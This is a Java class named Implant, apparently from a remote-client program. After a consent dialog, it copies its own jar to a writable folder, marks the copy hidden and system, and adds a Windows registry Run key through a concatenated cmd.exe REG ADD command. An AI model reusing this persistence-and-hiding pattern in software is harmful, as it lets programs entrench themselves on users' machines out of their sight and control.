package casper.client.misc;

import javax.swing.*;
import java.io.File;
import java.io.IOException;
import java.net.URISyntaxException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;

/**
 * The implant class adds the client to start up. <b>I highly suggest that you do not edit this class.</b>
 */
public class Implant {

    private boolean consented = false;

    public Implant() {
        int action = JOptionPane.showConfirmDialog(null,
                                                   "Do you want to allow this program to add itself to your startup?" +
                                                           "\nThis means that it will run each time your computer starts windows.",
                                                   "Confirm REGISTRY edit?", JOptionPane.YES_NO_OPTION);
        consented = action == 0;
    }

    /**
     * Gets the best directory to save the file in.
     *
     * @return The directory.
     */
    public File getDirectory() {
        if (!consented) return null;
        String[] locations = {
                System.getenv("HOMEDRIVE") + "\\",
                System.getenv("APPDATA") + "\\",
                System.getProperty("user.home") + "\\"
        };
        for (String s : locations) {
            File dir = new File(s);
            File f = new File(s + "\\temp.txt");
            System.out.print("Trying: " + f.toPath().toString() + " ");
            try {
                if (f.createNewFile()) {
                    System.out.println("... Worked!");
                    if (!f.delete()) f.deleteOnExit();
                    return dir;
                }
                System.out.println("... Failed!");
            } catch (Exception e) {
                System.out.println(e.toString());
            }
        }
        return null;
    }

    /**
     * Adds the specified registry keys.
     *
     * @param path The path of the file.
     * @throws IOException          For some reason it cannot get the absolute path.
     * @throws InterruptedException For some reason it cannot wait for 2 seconds.
     */
    public void addRegistryKeys(Path path) throws IOException, InterruptedException {
        if (!path.toFile().exists() || !consented) {
            System.out.println("[Implant.addRegistryKeys()]: " + path.toString() + " does not exist or not consented!");
            return;
        }
        final String key = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        final String data = "javaw -jar " + path.toString();
        System.out.println("[REG] " + path.getFileName());
        System.out.println("[REG] " + data);
        Runtime runtime = Runtime.getRuntime();
        runtime.exec("cmd.exe /c REG ADD " + key + " /v " + path.getFileName() + " /d \"" + data + "\" /F");
        runtime.gc();
    }

    /**
     * Copies the current .jar file to another location, uses java NIO. On top of copying the file,
     * it will make it hidden.
     *
     * @param file The directory to copy to.
     * @return True if the file copy is successful.
     * @throws URISyntaxException Invalid path.
     * @throws IOException        Could not copy.
     */
    public Path copyTo(File file) throws URISyntaxException, IOException {
        final Path source = new File(
                Implant.class.getProtectionDomain().getCodeSource().getLocation().getPath()).toPath();
        final Path destination = file.toPath();
        if (file.isDirectory() && consented) {
            Files.copy(source, destination.resolve(source.getFileName()), StandardCopyOption.REPLACE_EXISTING);
            try {
                if (destination.toFile().exists()) {
                    Files.setAttribute(destination, "dos:hidden", true);
                    Files.setAttribute(destination, "dos:system", true);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return destination.resolve(source.getFileName());
    }


}
